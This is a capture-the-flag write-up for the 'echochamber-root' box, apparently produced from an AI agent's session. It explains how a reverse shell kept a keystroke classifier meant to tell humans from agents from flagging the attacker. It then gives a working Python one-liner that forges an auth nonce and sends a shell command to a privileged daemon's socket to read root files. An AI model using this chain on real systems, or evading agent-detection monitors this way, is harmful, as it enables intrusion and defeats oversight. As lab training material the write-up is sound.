# echochamber-root -- boot2root

**Tools:** Python (nonce forging), the `analyst`-level RCE from [`echochamber-user`](../echochamber-user)
**Scripts:** No original script survived the session's ephemeral scratchpad; the method below is a
faithful reconstruction from the session transcript, not a recovered file.
**Flag:** `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`

## Enumeration

Starting from the `analyst` shell (see [`echochamber-user`](../echochamber-user)): the real target
users were `thm-admin` and `sentinel`, not `analyst`. Found the actual mechanic: a "warden" process
swaps `/etc/sentinel/{dispatch.json,suid.conf}` between `real/` and `decoy/` based on a
human-vs-agent verdict from a keystroke-telemetry classifier (fed by `libechotap.so` via
`LD_PRELOAD`, logging to `/var/log/echo/console.jsonl`).

## Analysis

Because the netcat-spawned reverse shell never ran through the tapped pty, that log stayed empty
and no adversarial verdict was ever generated -- `warden.state` stayed on `"human"`, keeping the
real (non-decoy) dispatch live. `sentinel.py` (readable through the RCE) publishes its own `SALT`,
so the per-minute auth nonce for its control socket could be computed directly rather than brute
forced or leaked.

## Exploit

    python3 -c '
    import socket, json, base64, hashlib, time
    SALT = "sentinel-salt-v1-a3b7c2d9"
    t = int(time.time()) // 60
    nonce = hashlib.sha256(f"{t}:{SALT}".encode()).hexdigest()[:16]
    payload = base64.b64encode(b"cat /home/sentinel/user.txt /root/root.txt 2>&1").decode()
    req = {"op": "shell", "nonce": nonce, "payload": payload}
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect("/run/sentinel/ctrl.sock")
    s.sendall((json.dumps(req) + "\n").encode())
    print(s.recv(65536).decode())'

The `sentinel` daemon runs with ambient `CAP_DAC_READ_SEARCH`, bypassing normal file permission
checks entirely -- so this single request read both the user and root flags in one shot despite
`analyst`/`echo-log` having no direct read access to either file.

## Verification

Confirmed directly after walking the SSTI -> RCE -> warden/pty-evasion -> forged-nonce chain end to
end. The one flag string actually pasted back into this session was `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`; see the note in
[`echochamber-user`](../echochamber-user) about which of the two CTFd entries it belongs to.
